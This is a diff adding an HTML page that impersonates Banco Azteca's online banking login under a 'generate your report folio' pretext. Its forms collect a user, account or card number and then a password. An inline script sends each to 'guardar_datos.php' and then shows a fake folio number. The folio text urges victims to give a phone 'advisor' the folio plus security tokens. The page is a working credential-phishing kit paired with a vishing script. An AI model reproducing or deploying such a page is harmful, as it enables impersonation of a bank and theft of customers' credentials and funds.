@@ -1,0 +1,197 @@
+<!doctype html>
+<html  lang="es_MX">
+<head>
+    <meta name="viewport" content="width=device-width">
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta property="og:locale" content="en_US">
+	<meta property="og:type" content="website">
+	<meta property="og:title" content="Genera Folio de Reporte | Azteca">
+	<meta property="og:description" content="Ingresa para generar tu folio de reporte de atención teléfonica o de asistencia virtual.">
+	<meta property="og:url" content="/">
+	<meta property="og:site_name" content="Reporte En Línea">
+	<meta property="article:modified_time" content="2023-03-31T16:44:13+00:00">
+	<meta property="og:image" content="/wp-content/uploads/2023/03/EXmND4-XQAAHzqN.jpg">
+	<meta property="og:image:width" content="924">
+	<meta property="og:image:height" content="512">
+	<meta property="og:image:type" content="image/jpeg">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:title" content="Reporte">
+	<meta name="twitter:label1" content="Est. reading time">
+	<meta name="twitter:data1" content="1 minute">
+
+    <link rel='stylesheet'  href='css/estilos.css' type='text/css' media='all' />
+
+<meta charset="utf-8">
+<title>Reporte - Reporte En Línea</title>
+</head>
+
+<body>
+    <div class="main">
+        <div class="topBar">
+          <div class="logo"><img src="img/logo-banco-azteca.jpeg"></div>
+          <div class="can"> Ingresa</div>
+        </div>
+		<div class="barVerde">PERSONAS</div>
+
+	<div class="bkPer">
+     <div class="acc">
+		<h1>Accede a<br>
+		tu <strong>Banca en Línea <span class="rojo">•</span></strong></h1>
+
+		<div class="contenedor">
+			<div class="columna-top-rwd">
+	
+			</div>
+			<div class="columna-izquierda">
+				<div class="registro activo" id="registro">
+					
+			
+						<form class="formulario" id="contact-form"  name="submit-form">
+						<label for="nombre"> </label>
+						<div class="contenedor-input">
+							<input id="nombre" name="nombre"  placeholder="Usuario/Cuenta/Tarjeta" required />
+						</div>	
+			
+						<div class="contenedor-boton">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
+								<b>INGRESAR</b>
+						</button>
+						<h2>OLVIDÉ MI CONTRASEÑA</h2>
+					           <div class="num">MX 05</div>
+						</div>
+					</form>
+				</div>
+	
+				<div class="header exito" id="exito">
+
+					<div class="registro activo" id="registro2">
+					<form class="formulario" id="contact-form"  name="submit-form2">
+						<label for="nombre"> </label>
+						<div class="contenedor-input">
+							<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
+							<input required type="password" id="confirma"  name="confirma" placeholder="Confirmar contraseña" />
+						</div>	
+			
+						<div class="contenedor-boton">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
+								<b>INGRESAR</b>
+						</button>
+					<div class="num">MX 05</div>
+						</div>
+					</form>
+				   </div>
+
+					
+				</div>
+			</div>
+
+			<div class="header exito" id="exito2">
+				<h2 class="txtFolio">Tu folio es:</h2>
+				<h1 class="folio">X142023543Q</h1>
+				<p class="txt">Comparte este folio con tu asesor teléfonico o asistente virtual. Así cómo un par de tokens para generar la cancelación de un movimiento.</p>
+				<p class="txt"><i><b>Recuerda que Banco Azteca nunca te pedirá tu contarseña por llamada teléfónica.</i></b></p>
+
+			</div>
+
+		</div>
+
+
+
+	 </div>
+
+	</div>	
+
+<div class="menuInf">
+	<div>
+       <b>Cónocenos</b>
+	   <ul>
+		<li>App de Banco Azteca</li>
+		<li>Sobre Banco Azteca</li>
+		<li>Información financiera</li>
+		<li>Banca Empresarial Azteca</li>
+		<li>Afore</li>
+		<li>Uso de CoDi de Banco Azteca</li>
+		<li>Trabaja con nosotros</li>
+		<li>Grupo Salinas</li>
+	   </ul>
+	</div>
+
+	<div>
+		<b>Contacto</b>
+		<ul>
+		 <li>Contáctanos </li>
+	     <li>Aclaraciones</li>
+	     <li>Mapa de sucursales</li>
+	     <li>Facturación</li>
+		</ul>
+	</div>
+
+	<div>
+		<b>Legal</b>
+		<ul>
+			<li>Términos y condiciones  </li>
+			<li>Aviso de privacidad</li>
+			<li>Avisos Legales – Repositorio Histórico</li>
+			<li>Ejerce tus derechos ARCO</li>
+			<li>Programa de ética, integridad y cumplimiento</li>
+			<li>Contratos</li>
+			<li>Buró de entidades financieras</li>
+			<li>Corresponsalías</li>
+			<li>Adhesión al Código global de conducta</li>
+			<li>Contrato de servicios financieros</li>
+			<li>Despachos de cobranza</li>
+		</ul>
+	</div>
+</div>
+
+<div class="copy">Banco Azteca S.A., Institución de Banca Múltiple. Todos los Derechos reservados, 2023</div>
+    </div>
+
+<script>
+
+const scriptURL =  'guardar_datos.php';
+const form = document.forms['submit-form']
+const form2 = document.forms['submit-form2']
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+form.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+
+form2.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+
+	function miMensaje() {
+  var element = document.getElementById("registro");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito");
+    element.classList.add("activo");	
+}	
+
+function miMensaje2() {
+  var element = document.getElementById("registro2");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito2");
+    element.classList.add("activo");	
+}
+</script>	
+
+	</body>
+	</html>
